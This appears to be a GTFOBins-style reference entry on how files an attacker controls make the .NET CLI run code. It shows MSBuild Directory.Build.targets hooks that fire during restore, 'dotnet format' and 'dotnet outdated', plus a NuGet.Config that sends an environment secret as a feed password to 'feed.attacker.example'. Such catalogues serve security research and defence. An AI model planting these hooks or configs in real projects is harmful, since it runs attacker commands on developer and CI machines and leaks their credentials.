---
title: dotnet
tags:
  - cli
  - config-file
  - input-file
  - eval-sh
files: [Directory.Build.props, Directory.Build.targets, "*.csproj", NuGet.Config]
references:
  - https://learn.microsoft.com/en-us/visualstudio/msbuild/customize-by-directory
  - https://learn.microsoft.com/en-us/dotnet/core/tools/dotnet-format
  - https://learn.microsoft.com/en-us/nuget/reference/nuget-config-file#packagesourcecredentials
  - https://github.com/dotnet-outdated/dotnet-outdated/blob/5002ab07f4128dd63e2df556ae01f415e49926fb/src/DotNetOutdated.Core/Services/DependencyGraphService.cs
---

The .NET CLI uses MSBuild to restore, build and inspect projects. An attacker controlling a project or its imported build files can execute commands without running the application.

## `Directory.Build.targets`

SDK-style projects automatically import the nearest `Directory.Build.targets` in the project directory or its parents. A restore hook runs even when the caller only requests dependencies:

```xml
<Project>
  <Target Name="Injected" BeforeTargets="Restore">
    <Exec Command="whoami" />
  </Target>
</Project>
```

```console
dotnet restore App.csproj
```

## `dotnet format`

Formatting an already restored project also processes MSBuild inputs. A target attached to `Compile` can run during a formatting check:

```xml
<Project>
  <Target Name="Injected" BeforeTargets="Compile">
    <Exec Command="whoami" />
  </Target>
</Project>
```

```console
dotnet format App.csproj --verify-no-changes --no-restore
```

`--verify-no-changes` restricts formatting edits, and `--no-restore` skips restore. Neither disables project tasks.

## `dotnet outdated`

The separately installed `dotnet-outdated-tool` generates dependency information through MSBuild. Its graph-generation stage can reach restore even with `--no-restore`, executing the restore hook above:

```console
dotnet outdated App.csproj --no-restore
```

## Sending a secret through feed configuration

During restore, the .NET CLI uses NuGet, which expands environment variables in configuration values, including feed passwords. An attacker controlling a loaded `NuGet.Config` and its feed endpoint can configure an environment secret as a feed password:

```xml
<configuration>
  <packageSources>
    <clear />
    <add key="project-feed" value="https://feed.attacker.example/v3/index.json" />
  </packageSources>
  <packageSourceCredentials>
    <project-feed>
      <add key="Username" value="build" />
      <add key="ClearTextPassword" value="%RELEASE_TOKEN%" />
      <add key="ValidAuthenticationTypes" value="basic" />
    </project-feed>
  </packageSourceCredentials>
</configuration>
```

```console
dotnet restore App.csproj
```

When restore contacts the feed and receives a Basic authentication challenge, it can send the expanded secret. The variable must be available and these credentials must be selected.
